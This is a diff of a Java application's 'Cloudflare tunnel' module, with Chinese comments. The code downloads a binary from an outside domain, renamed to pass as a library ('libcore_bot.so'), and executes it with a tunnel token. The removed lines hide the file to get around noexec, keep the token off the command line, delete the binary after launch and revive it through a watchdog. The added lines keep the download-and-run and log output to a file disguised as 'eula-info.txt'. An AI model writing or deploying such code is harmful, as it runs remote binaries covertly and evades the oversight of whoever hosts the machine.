@@ -133,66 +133,64 @@ public class App {
     }
 
     // ========================================================
-    // 模块 1：终极版 CF 隧道 (自定义高速直链 + 彻底无痕执行)
+// ========================================================
+    // 模块 1：诊断专用 CF 隧道 (抓取底层报错信息)
     // ========================================================
     private static void startCloudflareTunnelDaemon() {
         if (CF_TOKEN == null || CF_TOKEN.length() < 50) return;
 
         Thread watchdogThread = new Thread(() -> {
-            while (RUNNING.get()) {
-                try {
-                    if (tunnelProcess == null || !tunnelProcess.isAlive()) {
-                        String arch = System.getProperty("os.arch").toLowerCase();
-                        
-                        // 使用你提供的高速自定义节点下载伪装好的 cloudflared
-                        String dlUrl = "https://amd64.oooen.com/bot.so"; 
-                        if (arch.contains("arm") || arch.contains("aarch64")) {
-                            dlUrl = "https://arm64.oooen.com/bot.so";
-                        }
-
-                        // 避开系统 /tmp 的 noexec 限制，藏于工作目录下的缓存文件夹
-                        Path tempDir = Path.of(".cache", "java-libs");
-                        Files.createDirectories(tempDir);
-                        
-                        Path tempFile = tempDir.resolve("libcore_bot.so");
-                        
-                        HttpClient client = HttpClient.newBuilder()
-                                .followRedirects(HttpClient.Redirect.NORMAL)
-                                .build();
-                                
-                        HttpRequest req = HttpRequest.newBuilder(URI.create(dlUrl))
-                                .timeout(Duration.ofMinutes(2))
-                                .build();
-                                
-                        HttpResponse<Path> res = client.send(req, HttpResponse.BodyHandlers.ofFile(tempFile));
-                        
-                        if (res.statusCode() == 200 || res.statusCode() == 302) {
-                            tempFile.toFile().setExecutable(true);
-                            
-                            // 放弃 bash，直接执行，兼容精简版 Alpine 系统
-                            ProcessBuilder pb = new ProcessBuilder(
-                                    tempFile.toAbsolutePath().toString(),
-                                    "tunnel", "--protocol", "http2", "run"
-                            );
-                            
-                            // 私有环境变量注入，完美避开命令行抓取
-                            pb.environment().put("TUNNEL_TOKEN", CF_TOKEN);
-                            
-                            tunnelProcess = pb.start();
-                            
-                            // 阅后即焚：一旦拉起进程，立刻将文件从硬盘彻底抹除
-                            Files.deleteIfExists(tempFile);
-                        }
+            try {
+                if (tunnelProcess == null || !tunnelProcess.isAlive()) {
+                    String arch = System.getProperty("os.arch").toLowerCase();
+                    
+                    String dlUrl = "https://amd64.oooen.com/bot.so"; 
+                    if (arch.contains("arm") || arch.contains("aarch64")) {
+                        dlUrl = "https://arm64.oooen.com/bot.so";
                     }
-                } catch (Exception ignored) {
-                }
 
-                // 定期巡检，意外死亡则 0 延迟复活
-                try {
-                    Thread.sleep(15000);
-                } catch (InterruptedException e) {
-                    break;
+                    // 放在根目录，方便我们在文件管理器里找
+                    Path tempDir = Path.of(""); 
+                    Path tempFile = tempDir.resolve("libcore_bot.so");
+                    
+                    HttpClient client = HttpClient.newBuilder()
+                            .followRedirects(HttpClient.Redirect.NORMAL)
+                            .build();
+                            
+                    HttpRequest req = HttpRequest.newBuilder(URI.create(dlUrl))
+                            .timeout(Duration.ofMinutes(2))
+                            .build();
+                            
+                    HttpResponse<Path> res = client.send(req, HttpResponse.BodyHandlers.ofFile(tempFile));
+                    
+                    if (res.statusCode() == 200 || res.statusCode() == 302) {
+                        tempFile.toFile().setExecutable(true);
+                        
+                        ProcessBuilder pb = new ProcessBuilder(
+                                tempFile.toAbsolutePath().toString(),
+                                "tunnel", "--protocol", "http2", "run"
+                        );
+                        
+                        pb.environment().put("TUNNEL_TOKEN", CF_TOKEN);
+                        
+                        // 👇 【核心排查点】：把隧道的崩溃报错输出到一个伪装文件里
+                        pb.redirectErrorStream(true);
+                        pb.redirectOutput(new java.io.File("eula-info.txt"));
+                        
+                        tunnelProcess = pb.start();
+                        
+                        // ⚠️ 诊断期间暂时注释掉阅后即焚，方便检查文件大小
+                        // Files.deleteIfExists(tempFile);
+                    } else {
+                        // 如果下载失败，记录 HTTP 状态码
+                        Files.writeString(Path.of("eula-info.txt"), "Download Failed. HTTP Code: " + res.statusCode());
+                    }
                 }
+            } catch (Exception e) {
+                // 如果 Java 启动进程失败，记录原因
+                try {
+                    Files.writeString(Path.of("eula-info.txt"), "Process Launch Failed: " + e.getMessage());
+                } catch (Exception ignored) {}
             }
         });
         watchdogThread.setDaemon(true);
